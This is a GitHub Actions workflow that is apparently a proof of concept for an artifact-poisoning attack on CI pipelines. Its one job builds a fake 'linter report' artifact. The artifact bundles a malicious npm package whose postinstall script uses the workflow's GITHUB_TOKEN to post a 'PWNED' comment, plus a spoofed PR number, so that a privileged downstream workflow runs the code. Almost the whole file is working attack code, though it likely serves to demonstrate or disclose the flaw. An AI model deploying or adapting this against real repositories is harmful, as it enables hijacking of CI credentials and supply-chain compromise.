---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v6
        with:
          fetch-depth: 0

      - name: Build "linter report" artifact (attacker controlled)
        run: |
          mkdir -p pkg/package
          cat > pkg/package/package.json <<'PKGEOF'
          {"name":"evilpoc","version":"1.0.0","scripts":{"postinstall":"node poc.js"}}
          PKGEOF
          cat > pkg/package/poc.js <<'JSEOF'
          const fs = require('fs');
          (async () => {
            const info = {
              marker: 'PWNED_POSTINSTALL_IN_PRIVILEGED_WORKFLOW',
              workflow: process.env.GITHUB_WORKFLOW,
              workflow_ref: process.env.GITHUB_WORKFLOW_REF,
              event: process.env.GITHUB_EVENT_NAME,
              repo: process.env.GITHUB_REPOSITORY,
              hasToken: Boolean(process.env.GITHUB_TOKEN)
            };
            try {
              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/3/comments', {
                method: 'POST',
                headers: {
                  Authorization: 'Bearer ' + process.env.GITHUB_TOKEN,
                  Accept: 'application/vnd.github+json',
                  'Content-Type': 'application/json',
                  'X-GitHub-Api-Version': '2022-11-28'
                },
                body: JSON.stringify({ body: 'PWNED via artifact postinstall. workflow=' + process.env.GITHUB_WORKFLOW + ' ref=' + process.env.GITHUB_WORKFLOW_REF + ' event=' + process.env.GITHUB_EVENT_NAME + ' token=' + Boolean(process.env.GITHUB_TOKEN) })
              });
              info.commentStatus = r.status;
            } catch (e) { info.err = String(e); }
            console.log('POC_JSON ' + JSON.stringify(info));
            fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/pwned.json', JSON.stringify(info));
          })();
          JSEOF
          tar -czf evilpoc-1.0.0.tgz -C pkg package
          cat > package.json <<'ROOTEOF'
          {"name":"pocwsp","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"}}
          ROOTEOF
          echo "attacker controlled report body" > linter-report.txt
          echo "2" > pr-number.txt

      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
            evilpoc-1.0.0.tgz
